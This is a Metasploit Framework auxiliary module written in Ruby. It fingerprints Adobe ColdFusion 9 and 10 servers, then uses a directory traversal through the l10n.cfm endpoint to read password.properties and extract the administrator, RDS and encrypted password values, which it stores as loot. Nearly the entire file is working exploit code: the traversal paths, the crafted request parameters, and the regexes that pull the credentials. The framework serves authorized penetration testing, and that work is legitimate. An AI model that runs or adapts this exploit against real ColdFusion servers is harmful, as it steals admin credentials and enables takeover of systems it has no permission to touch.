##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "ColdFusion 'password.properties' Hash Extraction",
      'Description'    => %q{
          This module uses a directory traversal vulnerability to extract information
        such as password, rdspassword, and "encrypted" properties. This module has been
        tested successfully on ColdFusion 9 and ColdFusion 10. Use actions to select the
        target ColdFusion version.
      },
      'References'     =>
        [
          [ 'OSVDB', '93114' ],
          [ 'EDB', '25305' ]
        ],
      'Author'         =>
        [
          'HTP',
          'sinn3r',
          'nebulus'
        ],
      'License'        => MSF_LICENSE,
      'Actions'     =>
        [
          ['ColdFusion10'],
          ['ColdFusion9']
        ],
      'DefaultAction' => 'ColdFusion10',
      'DisclosureDate' => "May 7 2013"  #The day we saw the subzero poc
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptBool.new('CHECK', [false, 'Only check for vulnerability', false]),
        OptString.new("TARGETURI", [true, 'Base path to ColdFusion', '/'])
      ], self.class)
  end

  def fingerprint(response)

    if(response.headers.has_key?('Server') )
      if(response.headers['Server'] =~ /IIS/ or response.headers['Server'] =~ /\(Windows/)
        os = "Windows (#{response.headers['Server']})"
      elsif(response.headers['Server'] =~ /Apache\//)
          os = "Unix (#{response.headers['Server']})"
      else
        os = response.headers['Server']
      end
    end

    return nil if response.body.length < 100

    title = "Not Found"
    response.body.gsub!(/[\r\n]/, '')
    if(response.body =~ /<title.*\/?>(.+)<\/title\/?>/i)
      title = $1
      title.gsub!(/\s/, '')
    end
    return nil  if( title == 'Not Found' or not title =~ /ColdFusionAdministrator/)

    out = nil

    if(response.body =~ />\s*Version:\s*(.*)<\/strong\><br\s\//)
      v = $1
      out = (v =~ /^6/) ? "Adobe ColdFusion MX6 (Not Vulnerable)" : "Adobe ColdFusion MX7 (Not Vulnerable)"
    elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright 1995-2012 Adobe/ and response.body =~ /Administrator requires a browser that supports frames/ )
      out = "Adobe ColdFusion MX7 (Not Vulnerable)"
    elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2006 Adobe/)
      out = "Adobe ColdFusion 8 (Not Vulnerable)"
    elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995\-2010 Adobe/ and
      response.body =~ /1997\-2012 Adobe Systems Incorporated and its licensors/)
      out = "Adobe ColdFusion 10"
    elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2010 Adobe/ or
      response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995\-2009 Adobe Systems\, Inc\. All rights reserved/)
      out = "Adobe ColdFusion 9"
    elsif(response.body =~ /<meta name=\"Keywords\" content=\"(.*)\">\s+<meta name/)
      out = $1.split(/,/)[0]
    else
      out = 'Unknown ColdFusion'
    end

    if(title.downcase == 'coldfusionadministrator')
      out << " (you have administrator access)"
    end

    out << " (#{os})"
    file = ''
    trav = ''
    if(os =~ /Windows/ )
      trav = '..\..\..\..\..\..\..\..\..\..'
      file = (out =~ /ColdFusion 9/) ? '\ColdFusion9\lib\password.properties' : '\ColdFusion10\CFusion\lib\password.properties'
    else
      trav = '../../../../../../../../../..'
      file = (out =~ /ColdFusion 9/) ? '/opt/coldfusion9/lib/password.properties' : '/opt/coldfusion10/cfusion/lib/password.properties'
    end

    if(response.body =~ /Adobe/ and response.body =~ /ColdFusion/ and file == '')
      print_error("#{peer} Fingerprint failed...aborting")
      print_status("response: #{response.body}")
      return nil,nil
    end

    return out,"#{trav}#{file}"
  end

  def check
    vuln = false
    url = '/CFIDE/adminapi/customtags/l10n.cfm'
    res = send_request_cgi({
        'uri' => url,
        'method' => 'GET',
        'Connection' => "keep-alive",
        'Accept-Encoding' => "zip,deflate",
        })

    if(res != nil)
    # can't stack b/c res.code won't exist if res is nil
      vuln = true if(res.code == 500 and res.body =~ /attributes\.id was not provided/)
    end

    if(vuln)
      url = '/CFIDE/administrator/mail/download.cfm'
      res = send_request_cgi({
          'uri' => url,
          'method' => 'GET',
          'Connection' => "keep-alive",
          'Accept-Encoding' => "zip,deflate",
          })
      if(res != nil)
        vuln = false if (res.code != 200)
      end
    end

    return vuln
  end


  def run
    filename = ""

    url = '/CFIDE/administrator/index.cfm'
#		print_status("Getting index...")
    res = send_request_cgi({
        'uri' => url,
        'method' => 'GET',
        'Connection' => "keep-alive",
        'Accept-Encoding' => "zip,deflate",
        })
#		print_status("Got back: #{res.inspect}")
    return if not res
    return if not res.body or not res.code
    return if not res.code.to_i == 200

    out, filename = fingerprint(res)
    print_status("#{peer} #{out}") if out

    if(out =~ /Not Vulnerable/)
      print_status("#{peer} isn't vulnerable to this attack")
      return
    end

    if(not check)
      print_status("#{peer} can't be exploited (either files missing or permissions block access)")
      return
    end

    if (datastore['CHECK'] )
      print_good("#{peer} is vulnerable and most likely exploitable") if check
      return
    end


    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, 'CFIDE', 'adminapi', 'customtags', 'l10n.cfm'),
      'encode_params' => false,
      'encode' => false,
      'vars_get' => {
        'attributes.id'            => 'it',
        'attributes.file'          => '../../administrator/mail/download.cfm',
        'filename'                 => filename,
        'attributes.locale'        => 'it',
        'attributes.var'           => 'it',
        'attributes.jscript'       => 'false',
        'attributes.type'          => 'text/html',
        'attributes.charset'       => 'UTF-8',
        'thisTag.executionmode'    => 'end',
        'thisTag.generatedContent' => 'htp'
      }
    })

    if res.nil?
      print_error("#{peer} - Unable to receive a response")
      return
    end

    rdspass   = res.body.scan(/^rdspassword=(.+)/).flatten[0] || ''
    password  = res.body.scan(/^password=(.+)/).flatten[0]    || ''
    encrypted = res.body.scan(/^encrypted=(.+)/).flatten[0]   || ''

    if rdspass.empty? and password.empty?
      # No pass collected, no point to store anything
      print_error("#{peer} - No passwords found")
      return
    end

    print_good("#{peer} - rdspassword = #{rdspass}")
    print_good("#{peer} - password    = #{password}")
    print_good("#{peer} - encrypted   = #{encrypted}")

    p = store_loot('coldfusion.password.properties', 'text/plain', rhost, res.body)
    print_good("#{peer} - password.properties stored in '#{p}'")
  end
end
